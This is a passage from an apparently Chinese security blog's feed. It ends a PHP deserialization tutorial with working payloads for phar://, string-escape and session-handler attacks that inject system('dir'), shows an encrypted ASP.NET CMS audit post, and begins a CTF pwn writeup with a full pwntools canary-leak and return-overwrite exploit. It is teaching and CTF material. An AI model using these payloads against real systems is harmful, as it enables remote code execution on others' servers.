class="hljs-string">'obj'</span>]);</span><br></pre></td></tr></table></figure><p><img src="/2021/07/30/php反序列化浅析/屏幕截图 2021-07-25 135404.png" alt></p><p>以上payload中，序列化字符串描述属性有两个，但实际只有一个，绕过了<code>__wakeup</code>，command参数没有被替换为phpinfo，执行了我们的<code>dir</code>命令。</p><h3 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h3><p>直接的php反序列化使用的是<code>unserialize</code>这个函数，但很多时候不一定会有这个函数，这个可以利用phar实现反序列化。phar是php的归档文件，phar中有一处存储序列化后的mate-data信息，通过<code>phar://</code>伪协议，配合某些文件函数就可以进行php反序列化。</p><p>生成Phar归档文件的代码如下，从seebug上CV下来的，<code>setMetadata</code>方法的参数就是需要序列化的对象。</p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="hljs-string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">"phar.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="hljs-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="hljs-comment">//设置stub</span></span><br><span class="line">    $o = <span class="hljs-keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="hljs-comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="hljs-comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一次运行可能会报phar无法生成的问题，按照报错信息在配置文件中把<code>phar.readonly</code>关闭即可。</p><p><img src="/2021/07/30/php反序列化浅析/屏幕截图 2021-07-26 075422.png" alt></p><p>打开生成的phar归档文件，在里面可以看到序列化后的TestObject对象。</p><p><img src="/2021/07/30/php反序列化浅析/屏幕截图 2021-07-26 082531.png" alt></p><p>然后就可以使用文件函数配合<code>phar:\\</code>伪协议，进行php反序列化。可用的文件函数如下，也是用的seebug的图。</p><p><img src="/2021/07/30/php反序列化浅析/17c4c630-b5f7-4e02-af48-160cd8fcf73a.png" alt></p><p>写个Demo测试下：</p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span></span></span><br><span class="line"><span class="hljs-class"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">var</span> $command;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>&#123;</span><br><span class="line">        @<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="hljs-string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="hljs-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$o = <span class="hljs-keyword">new</span> TestObject();</span><br><span class="line">$o-&gt;command = <span class="hljs-string">"phpinfo();"</span>;</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">file_get_contents(<span class="hljs-string">"phar://phar.phar/test.txt"</span>);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/07/30/php反序列化浅析/屏幕截图 2021-07-27 163550.png" alt></p><p>顺便说下，我用php8测试<code>phar:\\</code>伪协议的时候发现它不会进行反序列化了。网上查了下，P神的文章里说php8里的Phar中的元信息不再自动进行反序列化了。</p><p>关于phar反序列化还有两个trick，当代码中有过滤，传入的文件名不能以<code>phar://</code>开头，但在前面加上<code>compress.zlib://</code>还是能反序列化；phar归档文件的stub标志只需<code>__HALT_COMPILER(); ?&gt;</code>，前面可加上任何内容，可以绕过文件头检测的文件上传。</p><h3 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h3><p>在php中是靠描述的长度来识别字符串变量开始与结束，以分号<code>;</code>来分隔，以花括号<code>}</code>来代表对象或数组的结束，所以像下列代码一样，字符串变量中的双引号花括号或序列化字符串后加上点内容也丝毫不影响反序列化。</p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">var</span> $test;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$unser1 = <span class="hljs-string">'O:4:"Test":1:&#123;s:4:"test";s:12:"testtest"&#125;&#125;&#125;";&#125;'</span>;</span><br><span class="line">$unser2 = <span class="hljs-string">'O:4:"Test":1:&#123;s:4:"test";s:12:"testtesttest";&#125;""""&#125;&#125;&#125;&#125;'</span>;</span><br><span class="line"></span><br><span class="line">var_dump(unserialize($unser1));</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">var_dump(unserialize($unser2));</span><br></pre></td></tr></table></figure><p><img src="/2021/07/30/php反序列化浅析/屏幕截图 2021-07-28 231939.png" alt></p><p>因为这种特性，如果在序列化后对序列化字符串进行过滤或替换，使得替换前后的长度发生变化，一边情况下会导致反序列化出错，在加以利用可造成字符串的逃逸，修改其他参数的值。</p><p>根据替换前后的长度变化，可将情况跟为两种：替换后长度变长、替换后长度变短，以下分别分析这两种情况。</p><h4 id="替换后长度变长"><a href="#替换后长度变长" class="headerlink" title="替换后长度变长"></a>替换后长度变长</h4><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span></span><br><span class="line"><span class="hljs-class"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">var</span> $test;</span><br><span class="line">    <span class="hljs-keyword">var</span> $command;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>&#123;</span><br><span class="line">        @<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test = <span class="hljs-keyword">new</span> Test();</span><br><span class="line">$test-&gt;command = <span class="hljs-string">"phpinfo();"</span>;</span><br><span class="line">$test-&gt;test = $_GET[<span class="hljs-string">"test"</span>];</span><br><span class="line">$ser = serialize($test);</span><br><span class="line">$ser = str_replace(<span class="hljs-string">"z"</span>, <span class="hljs-string">"zz"</span>, $ser);</span><br><span class="line">var_dump(unserialize($ser));</span><br></pre></td></tr></table></figure><p>这个Demo的目的是要把commond属性替换为我们的命令，需要逃逸的字符串为<code>&quot;;s:7:&quot;command&quot;;s:14:&quot;system(&#39;dir&#39;);&quot;;}</code>，替换前后的长度变化为由1变2，那令z的长度等于需要逃逸的字符串的长度即可，最终payload为：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz&quot;;s:7:&quot;command&quot;;s:14:&quot;system(&apos;dir&apos;);&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/07/30/php反序列化浅析/屏幕截图 2021-07-29 143903.png" alt></p><h4 id="替换后长度变短"><a href="#替换后长度变短" class="headerlink" title="替换后长度变短"></a>替换后长度变短</h4><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span></span><br><span class="line"><span class="hljs-class"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">var</span> $test1;</span><br><span class="line">    <span class="hljs-keyword">var</span> $test2;</span><br><span class="line">    <span class="hljs-keyword">var</span> $command;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>&#123;</span><br><span class="line">        @<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test = <span class="hljs-keyword">new</span> Test();</span><br><span class="line">$test-&gt;command = <span class="hljs-string">"phpinfo();"</span>;</span><br><span class="line">$test-&gt;test1 = $_GET[<span class="hljs-string">"test1"</span>];</span><br><span class="line">$test-&gt;test2 = $_GET[<span class="hljs-string">"test2"</span>];</span><br><span class="line">$ser = serialize($test);</span><br><span class="line">$ser = str_replace(<span class="hljs-string">"ab"</span>, <span class="hljs-string">""</span>, $ser);</span><br><span class="line">var_dump(unserialize($ser));</span><br></pre></td></tr></table></figure><p>替换后长度由长变短，似乎需要至少两个属性可控才能逃逸字符串。第一个属性用于减少减短长度，第二字符串用于逃逸字符串，需要减少的长度为第一个属性的内容到第二个属性需要逃逸的字符串之间的距离。最终payload为以下内容。需要注意的是，长度减短后，test2属性就被吞掉了，逃逸时需要加一个属性使得属性数量为3，才能正常反序列化。由于php不存在的属性也能被反序列化的特殊，这里随便加个属性即可。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test1=abababababababababab&amp;test2=&quot;;s:7:&quot;command&quot;;s:14:&quot;system(&apos;dir&apos;);&quot;;i:1;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/07/30/php反序列化浅析/屏幕截图 2021-07-29 150824.png" alt></p><h3 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h3><p>php中的session一般以文件形式存储，存储的格式又为序列化格式。php的session序列化处理器有三种，分别为<code>php</code>、<code>php_serialize</code>和<code>php_binary</code>，通过php.ini中的<code>session.serialize_handler</code>设置，默认为<code>php</code>。</p><ul><li><p>php序列化处理器</p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="hljs-string">'session.serialize_handler'</span>,<span class="hljs-string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="hljs-string">"test"</span>]=<span class="hljs-string">"session"</span>;</span><br></pre></td></tr></table></figure><p><img src="/2021/07/30/php反序列化浅析/屏幕截图 2021-07-30 100542.png" alt></p><p>session的格式为：键加上分隔符<code>|</code>加上序列化内容。</p></li><li><p>php_serialize序列化控制器</p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="hljs-string">'session.serialize_handler'</span>,<span class="hljs-string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="hljs-string">"test"</span>]=<span class="hljs-string">"session"</span>;</span><br></pre></td></tr></table></figure><p>session的格式为：<code>$_SESSION</code>这个数组的序列化内容。</p></li><li><p>php_binary序列化处理器</p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="hljs-string">'session.serialize_handler'</span>,<span class="hljs-string">'php_binary'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="hljs-string">"test"</span>]=<span class="hljs-string">"session"</span>;</span><br></pre></td></tr></table></figure><p>session的格式为：一个字节记录键的长度，然后拼上键，再拼上序列化内容。这里键<code>test</code>的长度为4，所以记录的键长度的字节为<code>04</code>。</p><p><img src="/2021/07/30/php反序列化浅析/屏幕截图 2021-07-30 102545.png" alt></p></li></ul><p>当程序员混用序列化控制器时，由于session内容的解析方式不同，再精心构造下可造成反序列化漏洞。网上的文章大都是<code>php_serialize</code>保存session，<code>php</code>读取session这种方式造成反序列化漏洞的，这里就先探讨这种方式。</p><h4 id="php-serialize转php"><a href="#php-serialize转php" class="headerlink" title="php_serialize转php"></a>php_serialize转php</h4><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// php_serialize.php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="hljs-string">'session.serialize_handler'</span>, <span class="hljs-string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="hljs-string">"test"</span>] = $_GET[<span class="hljs-string">"test"</span>];</span><br></pre></td></tr></table></figure><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// php.php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="hljs-string">'session.serialize_handler'</span>,<span class="hljs-string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span></span><br><span class="line"><span class="hljs-class"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">var</span> $command;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>&#123;</span><br><span class="line">        @<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当test传入的内容为<code>|O:4:&quot;Test&quot;:1:{s:7:&quot;command&quot;;s:10:&quot;phpinfo();&quot;;}</code>，保存session时，<code>php_serialize</code>直接序列化<code>$_SESSION</code>数组；读取session时，由<code>php</code>解析，由于有一个分隔符<code>|</code>，分隔符前的内容被当成键，分隔符后的内容被当成序列化内容，并会被自动的反序列化，然后自动调用魔术方法<code>__wakeup</code>，执行了<code>phpinfo</code>。</p><p><img src="/2021/07/30/php反序列化浅析/屏幕截图 2021-07-30 110255.png" alt></p><p><img src="/2021/07/30/php反序列化浅析/屏幕截图 2021-07-30 112138.png" alt></p><h4 id="php-binary转php"><a href="#php-binary转php" class="headerlink" title="php_binary转php"></a>php_binary转php</h4><p>payload与php_serialize转php的通用，这里就不细说了。</p><h4 id="php-binary转php-serialize"><a href="#php-binary转php-serialize" class="headerlink" title="php_binary转php_serialize"></a>php_binary转php_serialize</h4><p><code>php_serialize</code>序列化处理器要能反序列化，<code>php_binary</code>相应的就需要以<code>a</code>开头，所以键长度要为116。总的来说，这种情况反序列化漏洞，需要session的键可控才可实现了。</p><p>最后的poc是这样，后面一串<code>a</code>用来填充长度到116：</p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="hljs-string">'session.serialize_handler'</span>, <span class="hljs-string">'php_binary'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="hljs-string">':1:&#123;s:1:"a";O:4:"Test":1:&#123;s:7:"command";s:10:"phpinfo();";&#125;;&#125;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'</span>] = <span class="hljs-string">"a"</span>;</span><br></pre></td></tr></table></figure><h4 id="php-serialize转php-binary"><a href="#php-serialize转php-binary" class="headerlink" title="php_serialize转php_binary"></a>php_serialize转php_binary</h4><p><code>php_serialize</code>处理器开头总是<code>a</code>，转到<code>php_binary</code>解析键长度需要为116，所以填充需要放在开头，加上其他的序列化内容的长度要为116。因为Demo里只有一个键值对，所以payload的构造简单点，如果存在其他的键值对，构造就里会复杂点，甚至没法构造。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaO:4:&quot;Test&quot;:1:&#123;s:7:&quot;command&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure><p>以上payload在<code>php_serialize</code>序列化处理器下生成的session，在<code>php_binary</code>里的解析方式如下：</p><p><img src="/2021/07/30/php反序列化浅析/屏幕截图 2021-07-30 145101.png" alt></p><h4 id="session反序列化小结"><a href="#session反序列化小结" class="headerlink" title="session反序列化小结"></a>session反序列化小结</h4><p>其他组合的session反序列化跟以上几个也大同小异，总的来说，主要围绕着首字节和分隔符<code>|</code>构造payload。除了转php的，也就是分隔符造成的反序列化漏洞外，其他组合的session反序列化，需要键名可控、session内容已知、可控键值对在session中靠前等条件，利用难度还是挺高的。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>PHP反序列化浅析终于写完了，时间比我预期的要久。水文章也是不能偷懒滴，希望后面的学习提高下效率吧，下一站，向Java反序列化进发！</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.php.net/manual/en/language.oop5.magic.php" target="_blank" rel="noopener">https://www.php.net/manual/en/language.oop5.magic.php</a></p><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p><p><a href="https://www.leavesongs.com/PHP/php-8-0-release.html" target="_blank" rel="noopener">https://www.leavesongs.com/PHP/php-8-0-release.html</a></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/107135706" target="_blank" rel="noopener">https://blog.csdn.net/qq_45521281/article/details/107135706</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;进阶的代码审计，反序列化是绕不过的坎啊。主流的几个Web开发语言，像php、C#、Java都有反序列化，其中就属php的反序列化简单易懂，反序列化的学习之路就从这里开始。&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
    
    
    <category term="反序列化" scheme="http://127.0.0.1/tags/反序列化/"/>
    
  </entry>
  
  <entry>
    <title>基于ASP.NET MVC的easycms的easy代码审计</title>
    <link href="http://127.0.0.1/2021/07/09/%E5%9F%BA%E4%BA%8EASP.NET_MVC%E7%9A%84easycms%E7%9A%84easy%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>http://127.0.0.1/2021/07/09/%E5%9F%BA%E4%BA%8EASP.NET_MVC%E7%9A%84easycms%E7%9A%84easy%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2021-07-09T14:51:53.000Z</published>
    <updated>2021-09-04T11:17:13.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="12be2f4156575ffc0aec0ca5ea2f3de8da99755b3f1225afc42b5e219da3198c"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
    
    
    <category term="SSTI" scheme="http://127.0.0.1/tags/SSTI/"/>
    
    <category term="XSS" scheme="http://127.0.0.1/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>[PWN]2020铁三第四赛区个人赛writeup</title>
    <link href="http://127.0.0.1/2020/11/09/2020%E9%93%81%E4%B8%89%E7%AC%AC%E5%9B%9B%E8%B5%9B%E5%8C%BA%E4%B8%AA%E4%BA%BA%E8%B5%9Bwriteup/"/>
    <id>http://127.0.0.1/2020/11/09/2020%E9%93%81%E4%B8%89%E7%AC%AC%E5%9B%9B%E8%B5%9B%E5%8C%BA%E4%B8%AA%E4%BA%BA%E8%B5%9Bwriteup/</id>
    <published>2020-11-09T05:38:27.000Z</published>
    <updated>2020-11-09T05:40:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>只有两道题都不难，但是最近没怎么做题，生疏了，做了好久才出来，留下没技术的泪水。还好队友给力，带我躺进了决赛。</p><a id="more"></a><p>顺便附上题目文件链接：</p><p><a href="./namepie.zip">namepie.zip</a></p><p><a href="./onetime.zip">onetime.zip</a></p><h2 id="namepie"><a href="#namepie" class="headerlink" title="namepie"></a>namepie</h2><p>IDA打开直接看伪代码，漏洞在函数<code>sub_9A0</code>，栈溢出，但事实上没这么简单。</p><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">ssize_t</span> sub_9A0()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x1E</span>uLL);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input your Name:"</span>);</span><br><span class="line">  read(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0x30</span>uLL);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"hello %s: and what do your want to sey!\n"</span>, &amp;s);</span><br><span class="line">  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0x60</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拉到linux上checksec查了下，保护全开，要成功栈溢出首先得绕过canary。</p><p><img src="/2020/11/09/2020铁三第四赛区个人赛writeup/屏幕截图 2020-11-08 221544.png" alt></p><p>canary最后一个字节为<code>00</code>，所以直接写入<code>0x29</code>个字符，覆盖掉<code>00</code>，利用<code>printf</code>就能读出canary。</p><p>程序里还有个<code>system(&#39;/bin/sh&#39;)</code>的backdoor，跟栈溢出的返回地址刚好就差一个字节，所以随机地址也没什么影响。</p><p>最后padding带上canary，还有就是读到的canary记得减去覆盖<code>00</code>的那个字节就行了。</p><p><img src="/2020/11/09/2020铁三第四赛区个人赛writeup/屏幕截图 2020-11-08 221637.png" alt></p><p>exp：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="hljs-string">'DEBUG'</span></span><br><span class="line">context.binary = <span class="hljs-string">'./namepie'</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">'l'</span>:</span><br><span class="line">    p = process([<span class="hljs-string">'./namepie'</span>])</span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">    p = remote(<span class="hljs-string">'172.20.14.91'</span>,<span class="hljs-number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># gdb.attach(p)</span></span><br><span class="line">p.sendafter(<span class="hljs-string">'Input your Name:'</span>,cyclic(<span class="hljs-number">0x29</span>))</span><br><span class="line">p.recvuntil(<span class="hljs-string">'iaaajaaa'</span>)</span><br><span class="line">canary = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-number">-0x6b</span></span><br><span class="line">print(hex(canary))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="hljs-string">'and what do your want to sey!\n'</span>,flat(cyclic(<span class="hljs-number">0x28</span>),canary,<span class="hljs-number">0xdeadbeef</span>)+<span class="hljs-string">'\x71'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="onetime"><a href="#onetime" class="headerlink" 